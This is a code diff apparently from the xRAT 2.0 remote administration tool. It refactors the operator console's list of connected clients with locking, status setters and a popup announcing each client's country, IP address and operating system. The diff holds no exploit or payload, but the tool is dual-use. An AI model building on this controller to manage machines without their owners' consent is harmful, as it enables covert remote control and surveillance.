@@ -20,6 +20,7 @@ namespace xServer.Forms
         private readonly ListViewColumnSorter _lvwColumnSorter;
         public static volatile FrmMain Instance;
         private bool _titleUpdateRunning;
+        private readonly object _lockClients = new object();
 
         private void ReadSettings(bool writeIfNotExist = true)
         {
@@ -74,7 +75,7 @@ namespace xServer.Forms
             lstClients.ChangeTheme();
         }
 
-        public void UpdateWindowTitle(int count, int selected)
+        public void UpdateWindowTitle()
         {
             if (_titleUpdateRunning) return;
             _titleUpdateRunning = true;
@@ -82,28 +83,16 @@ namespace xServer.Forms
             {
                 this.Invoke((MethodInvoker) delegate
                 {
-#if DEBUG
-                    if (selected > 0)
-                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}] - Threads: {2}", count,
-                            selected, System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
-                    else
-                        this.Text = string.Format("xRAT 2.0 - Connected: {0} - Threads: {1}", count,
-                            System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
-#else
-                    if (selected > 0)
-                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", count, selected);
-                    else
-                        this.Text = string.Format("xRAT 2.0 - Connected: {0}", count);
-#endif
+                    int selected = lstClients.SelectedItems.Count;
+                    this.Text = (selected > 0) ?
+                        string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients, selected) :
+                        string.Format("xRAT 2.0 - Connected: {0}", ListenServer.ConnectedClients);
                 });
             }
             catch
             {
             }
-            finally
-            {
-                _titleUpdateRunning = false;
-            }
+            _titleUpdateRunning = false;
         }
 
         private void InitializeServer()
@@ -196,7 +185,7 @@ namespace xServer.Forms
 
         private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
         {
-            UpdateWindowTitle(ListenServer.ConnectedClients, lstClients.SelectedItems.Count);
+            UpdateWindowTitle();
         }
 
         private void ServerState(Server server, bool listening)
@@ -220,26 +209,7 @@ namespace xServer.Forms
                 new Core.Packets.ServerPackets.InitializeCommand().Execute(client);
             }
             else
-            {
-                int selectedClients = 0;
-                this.Invoke((MethodInvoker) delegate
-                {
-                    foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
-                        .Where(lvi => lvi != null && (lvi.Tag as Client) != null && (Client) lvi.Tag == client))
-                    {
-                        try
-                        {
-                            lvi.Remove();
-                        }
-                        catch
-                        {
-                        }
-                        server.ConnectedClients--;
-                    }
-                    selectedClients = lstClients.SelectedItems.Count;
-                });
-                UpdateWindowTitle(server.ConnectedClients, selectedClients);
-            }
+                RemoveClientFromListview(client);
         }
 
         private void ClientRead(Server server, Client client, IPacket packet)
@@ -247,18 +217,144 @@ namespace xServer.Forms
             PacketHandler.HandlePacket(client, packet);
         }
 
-        private Client[] GetSelectedClients()
+        public void SetToolTipText(Client c, string text)
+        {
+            try
+            {
+                lstClients.Invoke((MethodInvoker) delegate
+                {
+                    var item = GetListviewItemOfClient(c);
+                    if (item != null)
+                        item.ToolTipText = text;
+                });
+            }
+            catch (InvalidOperationException)
+            {
+            }
+        }
+
+        public void AddClientToListview(ListViewItem clientItem)
+        {
+            try
+            {
+                if (clientItem == null) return;
+
+                lstClients.Invoke((MethodInvoker) delegate
+                {
+                    lock (_lockClients)
+                    {
+                        lstClients.Items.Add(clientItem);
+                        ListenServer.ConnectedClients++;
+                    }
+                });
+
+                UpdateWindowTitle();
+            }
+            catch (InvalidOperationException)
+            {
+            }
+        }
+
+        public void RemoveClientFromListview(Client c)
+        {
+            try
+            {
+                lstClients.Invoke((MethodInvoker) delegate
+                {
+                    lock (_lockClients)
+                    {
+                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
+                            .Where(lvi => lvi != null && (lvi.Tag as Client) != null && c.Equals((Client) lvi.Tag)))
+                        {
+                            lvi.Remove();
+                            ListenServer.ConnectedClients--;
+                            break;
+                        }
+                    }
+                });
+                UpdateWindowTitle();
+            }
+            catch (InvalidOperationException)
+            {
+            }
+        }
+
+        public void SetClientStatus(Client c, string text)
+        {
+            try
+            {
+                lstClients.Invoke((MethodInvoker) delegate
+                {
+                    var item = GetListviewItemOfClient(c);
+                    if (item != null)
+                        item.SubItems[3].Text = text;
+                });
+            }
+            catch (InvalidOperationException)
+            {
+            }
+        }
+
+        public void SetClientUserStatus(Client c, string text)
+        {
+            try
+            {
+                lstClients.Invoke((MethodInvoker) delegate
+                {
+                    var item = GetListviewItemOfClient(c);
+                    if (item != null)
+                        item.SubItems[4].Text = text;
+                });
+            }
+            catch (InvalidOperationException)
+            {
+            }
+        }
+
+        public ListViewItem GetListviewItemOfClient(Client c)
+        {
+            ListViewItem itemClient = null;
+
+            lstClients.Invoke((MethodInvoker) delegate
+            {
+                foreach (var t in lstClients.Items.Cast<ListViewItem>()
+                    .Where(lvi => lvi != null && (lvi.Tag as Client) != null && c.Equals((Client) lvi.Tag)))
+                {
+                    itemClient = t;
+                    break;
+                }
+            });
+
+            return itemClient;
+        }
+
+        public Client[] GetSelectedClients()
         {
             List<Client> clients = new List<Client>();
 
-            if (lstClients.SelectedItems.Count == 0) return clients.ToArray();
-
             lstClients.Invoke((MethodInvoker)delegate
             {
-                clients.AddRange(lstClients.SelectedItems.Cast<ListViewItem>().Where(lvi => lvi != null && (lvi.Tag as Client) != null).Select(lvi => (Client)lvi.Tag));
+                lock (_lockClients)
+                {
+                    if (lstClients.SelectedItems.Count == 0) return;
+                    clients.AddRange(
+                        lstClients.SelectedItems.Cast<ListViewItem>()
+                            .Where(lvi => lvi != null && (lvi.Tag as Client) != null)
+                            .Select(lvi => (Client) lvi.Tag));
+                }
             });
 
             return clients.ToArray();
+        }
+
+        public void ShowPopup(Client c)
+        {
+            this.Invoke((MethodInvoker)delegate
+            {
+                nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country),
+                    string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
+                    c.Value.OperatingSystem), ToolTipIcon.Info);
+            });
         }
 
         private void lstClients_ColumnClick(object sender, ColumnClickEventArgs e)
